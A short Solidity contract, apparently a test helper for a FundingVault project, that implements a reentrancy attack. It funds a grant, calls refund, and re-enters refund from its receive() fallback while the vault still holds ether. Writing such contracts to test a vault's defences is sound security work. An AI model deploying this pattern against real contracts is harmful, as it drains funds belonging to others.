// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../../src/FundingVault.sol";

contract ReentrancyAttacker {
    FundingVault vault;
    uint256 grantId;

    constructor(address _vault, uint256 _grantId) {
        vault = FundingVault(_vault);
        grantId = _grantId;
    }

    receive() external payable {
        // Attempt reentrancy
        if (address(vault).balance > 0) {
            vault.refund(grantId);
        }
    }

    function attack() external payable {
        vault.fundGrant{value: msg.value}(grantId);
        vault.refund(grantId);
    }
}
